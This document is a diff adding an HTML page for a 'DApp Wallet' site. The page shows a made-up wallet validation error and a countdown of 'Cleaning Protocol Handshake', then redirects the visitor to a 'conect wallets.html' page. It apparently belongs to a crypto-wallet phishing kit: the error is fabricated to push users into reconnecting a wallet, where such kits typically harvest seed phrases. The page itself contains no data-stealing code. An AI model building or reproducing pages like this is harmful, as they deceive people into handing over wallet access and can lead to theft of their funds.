@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./assets/css.css">
+    <title>Defi</title>
+
+</head>
+<body>
+      
+    <section class="header">
+        <nav class="nav">
+           <h1>
+            DApp Wallet
+           </h1>
+           <div>
+            <hr>
+            <hr>
+           </div>
+           <ul>
+            <li>
+                Overview
+            </li>
+            <li>
+                Integration
+            </li>
+            <li>
+                <button>
+                    Connect
+                </button>
+            </li>
+           </ul>
+        </nav>
+    </section>
+
+
+    <section class="form" style="margin-top: calc(60px + 1vw);">
+
+        <form class="" style="align-items: center;">
+           <img src="./assets/image/error.png.png" alt="">
+            <h1>
+                Something went wrong!
+            </h1>
+       <p>
+        Wallet failed validation. Ensure its a V3 wallet.
+       </p>
+       <p>
+        Cleaning Protocol Handshake ... <b>20</b>
+       </p>
+        </form>
+    </section>
+
+    <script>
+      var winUrl="http://127.0.0.1:5502"
+      var  count=20
+
+        setInterval(() => {
+            count--
+            document.querySelector("p b").innerHTML=count
+            if (count===0) {
+                window.location=`${winUrl}/conect wallets.html`
+            }
+        }, 500);
+
+
+    </script>
+    
+
+  
+
+
+    <footer>
+          <p>
+            ©Defi, 2018—2023.
+          </p>
+          <ul>
+            <li>
+                <p>
+                    Legal documents
+                </p>
+            </li>
+            <li>
+                <p>
+                    Knowledge base
+                </p>
+            </li>
+            <li>
+                <p>
+                    Privacy policy
+                </p>
+            </li>
+          </ul>
+    </footer>
+
+    <script>
+        window.addEventListener('scroll', function() {
+          var scrollPosition = window.scrollY;
+          if (scrollPosition > 10) {
+            document.getElementsByTagName('body')[0].classList.add("body_scroll") // Show the indicator
+            // You can add additional actions here that you want to trigger when scrolled down 100 pixels
+        }else{
+              document.getElementsByTagName('body')[0].classList.remove("body_scroll") // Show the indicator
+
+          }
+          
+        });
+      </script>
+
+
+    <script src="./assets/js.js"></script>
+</body>
+</html>
